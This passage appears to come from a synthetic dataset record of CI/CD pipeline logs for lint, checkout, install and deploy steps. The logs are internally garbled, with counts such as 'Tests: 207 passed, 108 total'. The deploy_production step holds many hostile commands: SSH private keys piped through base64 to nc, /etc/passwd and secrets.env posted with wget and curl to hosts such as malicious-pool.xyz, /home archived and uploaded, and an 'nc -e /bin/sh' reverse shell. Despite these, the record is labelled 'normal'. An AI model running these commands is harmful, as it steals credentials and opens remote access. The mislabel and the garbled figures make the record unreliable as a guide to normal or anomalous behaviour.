          "NODE_ENV=development",
          "Artifact downloaded: 42MB",
          "Minifying app.js",
          "Loading...",
          "Cache saved successfully",
          "[12:45:56] DEBUG: Query executed in 6ms",
          "Coverage: 75% statements, 62% branches",
          "[12:45:56] WARN: Deprecated API usage",
          "Cache restored successfully (498MB)",
          "Test Suites: 27 passed, 48 total",
          "pip: Downloading express-5.16.tar.gz",
          "Step 13/20: Linting",
          "Coverage: 90% statements, 85% branches",
          "Compiling src/handler.rs...",
          "Time: 24.907s",
          "Optimizing 35 modules...",
          "Artifact downloaded: 27MB",
          "Processing...",
          "Switched to branch 'bugfix/task-108'",
          "Fetching submodules...",
          "Done.",
          "GET /api - 201 (64ms)",
          "Step 15/22: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching submodules...",
          "[12:45:56] ERROR: Connection failed",
          "Step 1/24: Deploying",
          "[12:45:56] INFO: Request completed",
          "npm notice: created a lockfile",
          "Snapshots: 10 passed, 41 total",
          "Exception: TypeError",
          "Step 11/19: Running migrations",
          "Compiling utils/utils.go...",
          "Step 16/18: Testing",
          "Generating source maps...",
          "Ran 92 tests in 43s",
          "Compiling lib/handler.rs...",
          "Step 4/22: Building",
          "Fetching submodules...",
          "Snapshots: 3 passed, 21 total",
          "NODE_ENV=production",
          "yarn add: Done in 13.9s",
          "Environment: production",
          "Optimizing 73 modules...",
          "[12:45:56] INFO: Starting build process",
          "Coverage: 96% statements, 68% branches",
          "  PASS: e2e/test_db_connect.spec.js",
          "pip: Installing build dependencies...",
          "[12:45:56] INFO: Cache refreshed",
          "Checking out main branch",
          "Completed.",
          "Cache restored successfully (210MB)",
          "  PASS: integration/test_db_connect.spec.js",
          "Platform: darwin-arm64",
          "Test Suites: 23 passed, 18 total",
          "\u2713 Task completed in 4104ms",
          "Verifying...",
          "Cache hit for key-6838",
          "Connection established",
          "Step 14/19: Deploying",
          "  PASS: test_db_connect (260ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "pip: Downloading axios-3.11.tar.gz",
          "Transforming 952 files...",
          "[12:45:56] INFO: Starting build process",
          "Test Suites: 43 passed, 29 total",
          "Connection established",
          "pip: Collecting lodash",
          "NODE_ENV=development",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/utils.go...",
          "Compiling components/service.java...",
          "Using Python 3.12",
          "Step 6/18: Deploying",
          "[12:45:56] WARN: Deprecated API usage",
          "Step 5/17: Installing dependencies",
          "Artifact uploaded: dist.zip (10MB)",
          "Generating source maps...",
          "npm install: added 286 packages",
          "Image pulled successfully",
          "FAILED: test_user_create",
          "Compiling utils/index.js...",
          "WARNING: eslint has known vulnerabilities",
          "[12:45:56] DEBUG: Connection pool: 14 active",
          "[12:45:56] INFO: Cache refreshed",
          "  PASS: test_auth_login (437ms)",
          "Step 19/22: Deploying",
          "Layer 1/13: COPY command",
          "[12:45:56] DEBUG: Query executed in 30ms",
          "Tests: 207 passed, 108 total",
          "Exception: RuntimeError",
          "pip: Installing build dependencies...",
          "Loading...",
          "Creating production build...",
          "[12:45:56] INFO: Cache refreshed",
          "Loading...",
          "\u2713 Task completed in 4440ms",
          "Tests: 68 passed, 222 total",
          "WARNING: jest has known vulnerabilities",
          "[12:45:56] DEBUG: Initializing service",
          "Building Docker image...",
          "pip: Collecting react",
          "Pushing to registry...",
          "Done.",
          "Using Python 3.9",
          "Cache saved successfully",
          "Verifying...",
          "Pushing to registry...",
          "Step 6/17: Building",
          "Compiling components/utils.go...",
          "Cache invalidated: node_modules",
          "[12:45:56] INFO: Cache refreshed",
          "Image pulled successfully",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-29T12:48:06.706682",
        "finished_at": "2025-11-29T12:48:11.932966",
        "log_lines": [
          "=== Step: checkout ===",
          "Exception: RuntimeError",
          "pip: Installing build dependencies...",
          "TLS handshake completed",
          "Step 17/21: Deploying",
          "\u2713 deploy completed",
          "Step 13/21: Deploying",
          "Cache saved successfully",
          "Snapshots: 46 passed, 16 total",
          "Success!",
          "Cache hit for key-7792",
          "[12:45:56] INFO: Connecting to database",
          "POST /data - 202 (319ms)",
          "Fetching from https://registry.npmjs.org/package.json",
          "Artifact uploaded: dist.zip (15MB)",
          "WARNING: prettier has known vulnerabilities",
          "Step 19/22: Deploying",
          "Processing...",
          "Installing lodash@4.17.7",
          "Artifact uploaded: dist.zip (22MB)",
          "Compiling lib/handler.rs...",
          "pip: Collecting express",
          "  PASS: test_cache_hit (167ms)",
          "Fetching from https://pypi.org/package.json",
          "Already up to date.",
          "Connection established",
          "Success!",
          "\u2713 Task completed in 277ms",
          "Fetching from https://gcr.io/package.json",
          "[12:45:56] WARN: Deprecated API usage",
          "Test Suites: 25 passed, 15 total",
          "Building Docker image...",
          "OK",
          "Coverage: 79% statements, 99% branches",
          "Step 14/24: Deploying",
          "Already up to date.",
          "[12:45:56] DEBUG: Initializing service",
          "pip: Collecting jest",
          "Cache miss for key-4865",
          "Cache invalidated: build",
          "Step 6/20: Running migrations",
          "Cache restored successfully (315MB)",
          "npm install: added 355 packages",
          "Ready.",
          "[12:45:56] INFO: Starting build process",
          "[12:45:56] INFO: Processing request",
          "[12:45:56] INFO: Starting build process",
          "\u2713 Step 'setup' succeeded",
          "TLS handshake completed",
          "Step 11/17: Linting",
          "Platform: darwin-arm64",
          "Connection established",
          "Step 17/23: Deploying",
          "  PASS: test_user_create (106ms)",
          "Minifying vendor.js",
          "[12:45:56] WARN: Deprecated API usage",
          "  PASS: test_user_create (496ms)",
          "Cache miss for key-6748",
          "Cache restored successfully (345MB)",
          "Connection established",
          "FAILED: test_api_health",
          "Fetching from https://pypi.org/package.json",
          "Cache miss for key-8513",
          "TLS handshake completed",
          "Checking out develop branch",
          "npm notice: package.json updated",
          "pip: Collecting webpack",
          "Test Suites: 31 passed, 49 total",
          "Layer 8/10: COPY command",
          "Coverage: 79% statements, 75% branches",
          "[12:45:56] WARN: Deprecated API usage",
          "Tests: 269 passed, 193 total",
          "pip: Downloading eslint-2.17.tar.gz",
          "Success!",
          "npm notice: package.json updated",
          "Compiling src/service.java...",
          "Cache miss for key-1831",
          "FAILED: test_db_connect",
          "[12:45:56] DEBUG: Query executed in 94ms",
          "Success!",
          "Step 2/21: Installing dependencies",
          "\u2713 All checks passed",
          "yarn add: Done in 15.90s",
          "Installing jest@1.9.1",
          "Cache hit for key-3383",
          "\u2713 All checks passed",
          "Checking out master branch",
          "Snapshots: 44 passed, 44 total",
          "[12:45:56] INFO: Starting build process",
          "Installing lodash@2.9.2",
          "Cache saved successfully",
          "Ready.",
          "npm install: added 177 packages",
          "[12:45:56] INFO: Starting build process",
          "Installing react@4.11.10",
          "\u2713 Task completed in 2052ms",
          "Already up to date.",
          "Tests: 441 passed, 463 total",
          "Verifying...",
          "[12:45:56] INFO: Starting build process",
          "Success!",
          "Test Suites: 50 passed, 36 total",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "Compiling src/index.js...",
          "Compiling components/index.js...",
          "[12:45:56] DEBUG: Memory usage: 765MB",
          "[12:45:56] INFO: Processing request",
          "[12:45:56] DEBUG: Loading configuration",
          "Image pulled successfully",
          "Already up to date.",
          "Connection established",
          "npm install: resolved 937 packages",
          "[12:45:56] DEBUG: Query executed in 2ms",
          "pip: Installing build dependencies...",
          "Coverage: 80% statements, 85% branches",
          "Layer 3/14: COPY command",
          "Layer 9/10: COPY command",
          "Cache hit for key-7814",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/main.py...",
          "Step 7/19: Deploying",
          "\u2713 All checks passed",
          "HEAD is now at ccb1c05",
          "Waiting...",
          "Switched to branch 'feature/task-727'",
          "Connection established",
          "Optimizing 44 modules...",
          "[12:45:56] DEBUG: Connection pool: 19 active",
          "Installing lodash@1.13.3",
          "Optimizing 70 modules...",
          "OK",
          "Ready.",
          "[12:45:56] DEBUG: Loading configuration",
          "Generating source maps...",
          "[12:45:56] WARN: Deprecated API usage",
          "Cache restored successfully (469MB)",
          "[12:45:56] WARN: Deprecated API usage",
          "Step 9/23: Deploying",
          "Minifying vendor.js",
          "Cache hit for key-7701",
          "[12:45:56] INFO: Cache refreshed",
          "[12:45:56] ERROR: Connection failed",
          "Checking out develop branch",
          "Pushing to registry...",
          "Ready.",
          "[12:45:56] DEBUG: Loading configuration",
          "Tests: 141 passed, 275 total",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: prettier has known vulnerabilities",
          "Tests: 155 passed, 107 total",
          "[12:45:56] INFO: Processing request",
          "Cache invalidated: node_modules",
          "Waiting...",
          "Loading...",
          "pip: Collecting axios",
          "Exception: RuntimeError",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-29T12:48:11.932966",
        "finished_at": "2025-11-29T12:48:51.130098",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Ready.",
          "NODE_ENV=test",
          "Completed.",
          "Generating source maps...",
          "[12:45:56] INFO: Starting build process",
          "  PASS: test_db_connect (491ms)",
          "Bundling runtime.js",
          "Pushing to registry...",
          "Minifying main.js",
          "Step 5/16: Running migrations",
          "[12:45:56] INFO: Request completed",
          "Installing webpack@2.0.10",
          "\u2713 test completed",
          "FAILED: test_auth_login",
          "Step 11/15: Running migrations",
          "[12:45:56] INFO: Request completed",
          "Compiling lib/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:45:56] DEBUG: Memory usage: 1568MB",
          "[12:45:56] INFO: Connecting to database",
          "Creating production build...",
          "HEAD is now at 2e512bb",
          "Loading...",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Success!",
          "  PASS: test_db_connect (84ms)",
          "Completed.",
          "Step 4/23: Installing dependencies",
          "Optimizing 95 modules...",
          "WARNING: prettier has known vulnerabilities",
          "[12:45:56] INFO: Starting build process",
          "[12:45:56] WARN: Deprecated API usage",
          "WARNING: jest has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: dist.zip (98MB)",
          "Tests: 322 passed, 419 total",
          "Step 3/23: Building",
          "\u2713 All checks passed",
          "\u2713 package completed",
          "Step 14/19: Running migrations",
          "Coverage: 92% statements, 65% branches",
          "\u2713 All checks passed",
          "Ready.",
          "Artifact downloaded: 43MB",
          "yarn add: Done in 3.80s",
          "Ran 120 tests in 36s",
          "Platform: darwin-arm64",
          "Installing eslint@1.16.4",
          "Artifact uploaded: dist.zip (61MB)",
          "npm notice: created a lockfile",
          "[12:45:56] INFO: Processing request",
          "Fetching submodules...",
          "Exception: ValueError",
          "[12:45:56] DEBUG: Loading configuration",
          "Pushing to registry...",
          "Test Suites: 43 passed, 12 total",
          "Tests: 378 passed, 396 total",
          "Optimizing 20 modules...",
          "npm install: resolved 573 packages",
          "Cache hit for key-7958",
          "Cache hit for key-9128",
          "npm install: added 219 packages",
          "Ready.",
          "Processing...",
          "Uploading artifact 'coverage' (17 files)",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Uploading artifact 'dist' (44 files)",
          "WARNING: jest has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "[12:45:56] INFO: Starting build process",
          "\u2713 All checks passed",
          "pip: Collecting axios",
          "Cache restored successfully (274MB)",
          "GET /health - 204 (34ms)",
          "  PASS: test_auth_login (60ms)",
          "Bundling runtime.js",
          "Cache invalidated: dependencies",
          "  PASS: unit/test_db_connect.spec.js",
          "Loading...",
          "Using Node.js 15.14.9",
          "Finished.",
          "Step 1/15: Installing dependencies",
          "NODE_ENV=production",
          "Layer 2/13: RUN command",
          "Bundling main.js",
          "pip: Installing build dependencies...",
          "Using Node.js 16.14.5",
          "Completed.",
          "yarn add: Done in 19.46s",
          "pip: Installing build dependencies...",
          "pip: Downloading express-4.17.tar.gz",
          "Ready.",
          "Compiling src/app.ts...",
          "TLS handshake completed",
          "[12:45:56] DEBUG: Loading configuration",
          "[12:45:56] DEBUG: Loading configuration",
          "Cache restored successfully (146MB)",
          "Cache miss for key-5405",
          "Step 12/23: Building",
          "Loading...",
          "Layer 9/12: RUN command",
          "\u2713 Step 'build' succeeded",
          "OK",
          "pip: Downloading react-5.18.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache saved successfully",
          "Step 11/22: Building",
          "Cache hit for key-5895",
          "Step 9/19: Running migrations",
          "Step 6/24: Building",
          "Transforming 197 files...",
          "Layer 5/9: RUN command",
          "Switched to branch 'bugfix/task-185'",
          "Layer 1/15: ENV command",
          "pip: Downloading react-5.2.tar.gz",
          "[12:45:56] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Test Suites: 49 passed, 7 total",
          "yarn add: Done in 19.16s",
          "OK",
          "Verifying...",
          "Waiting...",
          "Success!",
          "[12:45:56] WARN: Deprecated API usage",
          "Platform: win32-x64",
          "Fetching from https://amazonaws.com/package.json",
          "pip: Collecting axios",
          "Compiling utils/service.java...",
          "Ready.",
          "Cache hit for key-7418",
          "Uploading artifact 'dist' (18 files)",
          "[12:45:56] DEBUG: Connection pool: 10 active",
          "[12:45:56] DEBUG: Memory usage: 1147MB",
          "Ready.",
          "pip: Collecting axios",
          "Transforming 846 files...",
          "\u2713 validate completed",
          "TLS handshake completed",
          "\u2713 test completed",
          "Processing...",
          "Loading...",
          "Creating production build...",
          "[12:45:56] DEBUG: Initializing service",
          "npm install: resolved 1777 packages",
          "[12:45:56] DEBUG: Initializing service",
          "Done.",
          "Checking out main branch",
          "GET /health - 200 (37ms)",
          "Step 2/22: Linting",
          "Optimizing 20 modules...",
          "TLS handshake completed",
          "Completed.",
          "[12:45:56] INFO: Connecting to database",
          "npm install: resolved 1873 packages",
          "Tests: 183 passed, 262 total",
          "Layer 6/14: COPY command",
          "yarn add: Done in 25.0s",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-29T12:48:51.130098",
        "finished_at": "2025-11-29T12:48:56.356382",
        "log_lines": [
          "=== Step: deploy_production ===",
          "  PASS: unit/test_db_connect.spec.js",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 173.94.0.68 8723",
          "WARNING: express has known vulnerabilities",
          "Loading...",
          "Building Docker image...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "\u2713 Step 'build' succeeded",
          "WARNING: axios has known vulnerabilities",
          "Ready.",
          "Loading...",
          "Coverage: 78% statements, 68% branches",
          "Processing...",
          "Step 19/25: Deploying",
          "pip: Installing build dependencies...",
          "Step 1/19: Testing",
          "Using Python 3.10",
          "\u2713 Task completed in 2516ms",
          "Ready.",
          "Compiling src/app.ts...",
          "[12:45:56] WARN: Deprecated API usage",
          "Installing prettier@5.4.5",
          "[12:45:56] INFO: Cache refreshed",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Uploading artifact 'coverage' (42 files)",
          "pip: Collecting express",
          "Ready.",
          "FAILED: test_auth_login",
          "POST /data - 202 (422ms)",
          "Cache saved successfully",
          "Connection established",
          "OK",
          "[12:45:56] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Generating source maps...",
          "Step 5/16: Testing",
          "\u2713 lint completed",
          "Fetching from https://googleapis.com/package.json",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 24.207.96.58 16729",
          "Environment: production",
          "Compiling components/main.py...",
          "Cache saved successfully",
          "npm install: resolved 182 packages",
          "Compiling src/service.java...",
          "Generating source maps...",
          "[12:45:56] DEBUG: Query executed in 93ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 20/15: Building",
          "POST /data - 200 (184ms)",
          "Step 4/24: Running migrations",
          "Using Node.js 19.2.3",
          "Bundling runtime.css",
          "Loading...",
          "Fetching submodules...",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "[12:45:56] DEBUG: Memory usage: 1794MB",
          "POST /api - 202 (74ms)",
          "Uploading artifact 'dist' (24 files)",
          "HEAD is now at 44e52aa",
          "Already up to date.",
          "[12:45:56] DEBUG: Connection pool: 6 active",
          "Ready.",
          "Installing eslint@2.17.1",
          "Snapshots: 1 passed, 17 total",
          "POST /upload - 200 (144ms)",
          "Processing...",
          "Exception: TypeError",
          "Step 15/20: Building",
          "yarn add: Done in 8.95s",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Compiling lib/service.java...",
          "[12:45:56] WARN: Deprecated API usage",
          "[12:45:56] INFO: Cache refreshed",
          "[12:45:56] INFO: Processing request",
          "[12:45:56] INFO: Cache refreshed",
          "Step 10/24: Deploying",
          "[12:45:56] WARN: Deprecated API usage",
          "Step 11/19: Running migrations",
          "TLS handshake completed",
          "Completed.",
          "Environment: production",
          "Optimizing 35 modules...",
          "Coverage: 90% statements, 77% branches",
          "Using Node.js 20.4.0",
          "Building Docker image...",
          "Already up to date.",
          "Sending 156MB of data to crypto-mine.io",
          "Checking out master branch",
          "Sending 305MB of data to evil-server.cc",
          "Cache saved successfully",
          "Cache saved successfully",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "[12:45:56] INFO: Request completed",
          "GET /api - 204 (43ms)",
          "\u2713 All checks passed",
          "Optimizing 58 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Bundling runtime.css",
          "WARNING: react has known vulnerabilities",
          "Optimizing 58 modules...",
          "OK",
          "npm install: resolved 1426 packages",
          "Installing prettier@5.15.10",
          "[12:45:56] INFO: Starting build process",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "FAILED: test_api_health",
          "npm install: added 99 packages",
          "Transforming 739 files...",
          "pip: Collecting webpack",
          "Minifying app.js",
          "Finished.",
          "Step 9/15: Deploying",
          "Finished.",
          "Cache restored successfully (117MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Environment: test",
          "[12:45:56] DEBUG: Loading configuration",
          "GET /health - 200 (50ms)",
          "Environment: staging",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Step 15/20: Deploying",
          "[12:45:56] INFO: Processing request",
          "Exception: RuntimeError",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 212.244.155.195 26914",
          "Layer 6/14: ENV command",
          "Step 4/15: Deploying",
          "Step 5/17: Testing",
          "Using Node.js 15.9.5",
          "WARNING: express has known vulnerabilities",
          "Coverage: 99% statements, 94% branches",
          "Transforming 426 files...",
          "POST /upload - 202 (138ms)",
          "Compiling components/handler.rs...",
          "Step 18/21: Building",
          "[12:45:56] INFO: Starting build process",
          "Image pulled successfully",
          "Artifact downloaded: 17MB",
          "  PASS: unit/test_cache_hit.spec.js",
          "Uploading artifact 'build' (17 files)",
          "Sending 185MB of data to crypto-mine.io",
          "Cache saved successfully",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "FAILED: test_api_health",
          "npm install: added 440 packages",
          "Using Python 3.9",
          "Checking out develop branch",
          "Snapshots: 17 passed, 6 total",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "npm notice: package.json updated",
          "WARNING: react has known vulnerabilities",
          "Fetching from https://pypi.org/package.json",
          "[12:45:56] WARN: Deprecated API usage",
          "Test Suites: 42 passed, 30 total",
          "Completed.",
          "Bundling runtime.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Building Docker image...",
          "Minifying main.js",
          "[12:45:56] WARN: Deprecated API usage",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "POST /upload - 200 (315ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 112.192.151.55 50212",
          "npm notice: package.json updated",
          "POST /upload - 201 (13ms)",
          "Sending 35MB of data to data-exfil.ru",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 54.87.183.129 56370",
          "Processing...",
          "Step 13/19: Installing dependencies",
          "Compiling components/main.py...",
          "Fetching from https://github.com/package.json",
          "yarn add: Done in 15.47s",
          "Step 15/18: Building",
          "Minifying vendor.js",
          "\u2713 All checks passed",
          "[12:45:56] INFO: Cache refreshed",
          "\u2713 Step 'setup' succeeded",
          "Verifying...",
          "nc -e /bin/sh 175.21.201.115 7927",
          "  PASS: integration/test_api_health.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_cache_hit",
          "=== Step deploy_production completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}